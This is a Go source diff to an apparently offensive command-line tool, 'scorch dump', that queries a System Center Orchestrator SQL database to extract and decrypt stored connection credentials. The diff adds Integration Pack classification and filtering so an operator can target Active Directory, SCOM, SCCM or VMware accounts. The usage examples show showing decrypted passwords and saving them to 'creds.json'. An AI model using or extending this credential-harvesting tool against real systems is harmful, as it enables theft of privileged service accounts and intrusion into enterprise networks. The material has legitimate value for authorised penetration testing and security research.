@@ -35,9 +35,15 @@ type Variable struct {
 type Connection struct {
 	Name     string `json:"name"`
 	Type     string `json:"type"`
+	IPType   string `json:"ip_type,omitempty"`
 	Server   string `json:"server,omitempty"`
 	Username string `json:"username,omitempty"`
 	Password string `json:"password,omitempty"`
+}
+
+type IPSummary struct {
+	Type  string `json:"type"`
+	Count int    `json:"count"`
 }
 
 type DatabaseInfo struct {
@@ -53,6 +59,7 @@ type DatabaseInfo struct {
 
 type DumpResult struct {
 	Info        *DatabaseInfo `json:"info,omitempty"`
+	IPSummary   []IPSummary   `json:"ip_summary,omitempty"`
 	Variables   []Variable    `json:"variables,omitempty"`
 	Connections []Connection  `json:"connections,omitempty"`
 }
@@ -82,7 +89,9 @@ func runDump(args []string) error {
 	infoOnly, remaining := parseBoolFlag(remaining, "-info", "--info")
 	all, remaining := parseBoolFlag(remaining, "-all", "--all")
 	decrypt, remaining := parseBoolFlag(remaining, "-decrypt", "--decrypt")
-	sensitive, _ := parseBoolFlag(remaining, "-sensitive", "--sensitive")
+	sensitive, remaining := parseBoolFlag(remaining, "-sensitive", "--sensitive")
+	ipSummary, remaining := parseBoolFlag(remaining, "-ip-summary", "--ip-summary")
+	ipFilter, _ := parseFlag(remaining, "-ip", "--ip")
 
 	if err := opts.Validate(); err != nil {
 		return err
@@ -132,15 +141,34 @@ func runDump(args []string) error {
 		return nil
 	}
 
-	if all || !infoOnly {
-		// Extract variables
-		printf(opts, "[*] Extracting variables...\n")
-		vars, err := extractVariables(ctx, db, decrypt)
+	// IP Summary mode
+	if ipSummary {
+		printf(opts, "[*] Getting Integration Pack summary...\n")
+		summary, err := getIPSummary(ctx, db)
 		if err != nil {
-			debugf(opts, "Error extracting variables: %v", err)
+			debugf(opts, "Error getting IP summary: %v", err)
 		} else {
-			result.Variables = vars
-			printf(opts, "[+] Found %d variables\n", len(vars))
+			result.IPSummary = summary
+			printf(opts, "[+] Found %d Integration Pack types\n", len(summary))
+		}
+		if opts.JSON {
+			return writeJSON(output, result)
+		}
+		printIPSummary(output, result.IPSummary)
+		return nil
+	}
+
+	if all || ipFilter != "" {
+		// Extract variables (unless filtering by IP type)
+		if ipFilter == "" {
+			printf(opts, "[*] Extracting variables...\n")
+			vars, err := extractVariables(ctx, db, decrypt)
+			if err != nil {
+				debugf(opts, "Error extracting variables: %v", err)
+			} else {
+				result.Variables = vars
+				printf(opts, "[+] Found %d variables\n", len(vars))
+			}
 		}
 
 		// Extract connections
@@ -149,8 +177,14 @@ func runDump(args []string) error {
 		if err != nil {
 			debugf(opts, "Error extracting connections: %v", err)
 		} else {
+			// Filter by IP type if specified
+			if ipFilter != "" {
+				conns = filterConnectionsByIP(conns, ipFilter)
+				printf(opts, "[+] Found %d connections matching '%s'\n", len(conns), ipFilter)
+			} else {
+				printf(opts, "[+] Found %d connections\n", len(conns))
+			}
 			result.Connections = conns
-			printf(opts, "[+] Found %d connections\n", len(conns))
 		}
 	}
 
@@ -405,6 +439,84 @@ func decryptDPAPI(encryptedData []byte) ([]byte, error) {
 	return nil, fmt.Errorf("DPAPI decryption not implemented - use -decrypt flag for SQL Server decryption")
 }
 
+// classifyIPType determines the Integration Pack type based on connection name/type
+func classifyIPType(name, connType string) string {
+	nameLower := strings.ToLower(name)
+	typeLower := strings.ToLower(connType)
+	combined := nameLower + " " + typeLower
+
+	switch {
+	case strings.Contains(combined, "active directory") || strings.Contains(combined, " ad ") || strings.Contains(typeLower, "activedirectory"):
+		return "Active Directory"
+	case strings.Contains(combined, "exchange"):
+		return "Exchange"
+	case strings.Contains(combined, "scom") || strings.Contains(combined, "operations manager") || strings.Contains(typeLower, "operationsmanager"):
+		return "SCOM"
+	case strings.Contains(combined, "sccm") || strings.Contains(combined, "configmgr") || strings.Contains(combined, "configuration manager") || strings.Contains(typeLower, "configurationmanager"):
+		return "SCCM"
+	case strings.Contains(combined, "vmware") || strings.Contains(combined, "vsphere") || strings.Contains(combined, "vcenter"):
+		return "VMware"
+	case strings.Contains(combined, "vmm") || strings.Contains(combined, "virtual machine manager"):
+		return "VMM"
+	case strings.Contains(combined, "azure"):
+		return "Azure"
+	case strings.Contains(combined, "sql") || strings.Contains(typeLower, "sqlserver"):
+		return "SQL Server"
+	case strings.Contains(combined, "ssh") || strings.Contains(typeLower, "ssh"):
+		return "SSH"
+	case strings.Contains(combined, "rest") || strings.Contains(typeLower, "rest"):
+		return "REST"
+	default:
+		return "Other"
+	}
+}
+
+// getIPSummary returns a summary of connection counts by Integration Pack type
+func getIPSummary(ctx context.Context, db *sql.DB) ([]IPSummary, error) {
+	query := `
+		SELECT 
+			o.Name,
+			c.Type
+		FROM dbo.CONNECTIONS c
+		INNER JOIN dbo.OBJECTS o ON o.UniqueID = c.UniqueID
+		WHERE c.Deleted = 0
+	`
+
+	rows, err := db.QueryContext(ctx, query)
+	if err != nil {
+		return nil, err
+	}
+	defer rows.Close()
+
+	counts := make(map[string]int)
+	for rows.Next() {
+		var name, connType string
+		if err := rows.Scan(&name, &connType); err != nil {
+			continue
+		}
+		ipType := classifyIPType(name, connType)
+		counts[ipType]++
+	}
+
+	var summary []IPSummary
+	for t, c := range counts {
+		summary = append(summary, IPSummary{Type: t, Count: c})
+	}
+	return summary, nil
+}
+
+// filterConnectionsByIP filters connections by Integration Pack type
+func filterConnectionsByIP(conns []Connection, ipType string) []Connection {
+	ipTypeLower := strings.ToLower(ipType)
+	var filtered []Connection
+	for _, c := range conns {
+		if strings.ToLower(c.IPType) == ipTypeLower || strings.Contains(strings.ToLower(c.IPType), ipTypeLower) {
+			filtered = append(filtered, c)
+		}
+	}
+	return filtered
+}
+
 func extractConnections(ctx context.Context, db *sql.DB, decrypt bool) ([]Connection, error) {
 	query := `
 		SELECT 
@@ -430,6 +542,9 @@ func extractConnections(ctx context.Context, db *sql.DB, decrypt bool) ([]Connec
 		if err := rows.Scan(&c.Name, &c.Type, &config); err != nil {
 			continue
 		}
+
+		// Classify IP type
+		c.IPType = classifyIPType(c.Name, c.Type)
 
 		// Parse configuration XML to extract server/username/password
 		if config != "" {
@@ -469,6 +584,15 @@ func maskDumpResult(result *DumpResult) {
 	}
 }
 
+func printIPSummary(w io.Writer, summary []IPSummary) {
+	fmt.Fprintln(w, "\n[+] Integration Pack Summary")
+	fmt.Fprintln(w, strings.Repeat("-", 40))
+	for _, s := range summary {
+		fmt.Fprintf(w, "  %-20s %d connections\n", s.Type, s.Count)
+	}
+	fmt.Fprintln(w)
+}
+
 func printDatabaseInfo(w io.Writer, info *DatabaseInfo) {
 	fmt.Fprintln(w, "\n[+] SCORCH Database Information")
 	fmt.Fprintln(w, strings.Repeat("=", 50))
@@ -503,7 +627,18 @@ func printDumpResult(w io.Writer, result *DumpResult, showPasswords bool) {
 		fmt.Fprintf(w, "\n[+] Connections (%d)\n", len(result.Connections))
 		fmt.Fprintln(w, strings.Repeat("-", 50))
 		for _, c := range result.Connections {
-			fmt.Fprintf(w, "  %s (%s)\n", c.Name, c.Type)
+			ipLabel := ""
+			if c.IPType != "" && c.IPType != "Other" {
+				ipLabel = fmt.Sprintf(" [%s]", c.IPType)
+			}
+			if c.Server != "" {
+				fmt.Fprintf(w, "  %s (%s)%s\n    Server: %s\n", c.Name, c.Type, ipLabel, c.Server)
+			} else {
+				fmt.Fprintf(w, "  %s (%s)%s\n", c.Name, c.Type, ipLabel)
+			}
+			if c.Username != "" {
+				fmt.Fprintf(w, "    User: %s\n", c.Username)
+			}
 		}
 	}
 
@@ -531,6 +666,10 @@ Options:
   -decrypt       Attempt to decrypt encrypted values
   -sensitive     Show decrypted passwords (default: masked)
 
+Integration Pack Filtering:
+  -ip-summary    Show summary of connections by Integration Pack type
+  -ip TYPE       Filter connections by IP type (AD, Exchange, SCOM, SCCM, VMware, etc.)
+
 Output:
   -json          JSON output
   -o, -output    Write to file
@@ -540,11 +679,22 @@ Examples:
   # Show database info (Windows auth from domain-joined Linux)
   scorch dump -t sqlserver.corp.local -info
 
+  # Get summary of Integration Pack connections
+  scorch dump -t sqlserver.corp.local -ip-summary
+
+  # Extract only Active Directory connections
+  scorch dump -t sqlserver.corp.local -ip AD -decrypt
+
+  # Extract only SCOM connections
+  scorch dump -t sqlserver.corp.local -ip SCOM -decrypt -sensitive
+
   # Extract and decrypt (SQL auth from non-domain box)
   scorch dump -t sqlserver.corp.local -u sa -p 'Pass123' -all -decrypt
 
   # Full extraction with sensitive passwords
   scorch dump -t sqlserver.corp.local -all -decrypt -sensitive -json -o creds.json
+
+IP Types: AD, Exchange, SCOM, SCCM, VMware, VMM, Azure, SQL, SSH, REST, Other
 
 Notes:
   - Decryption requires membership in Orchestrator Runtime or Admins database role
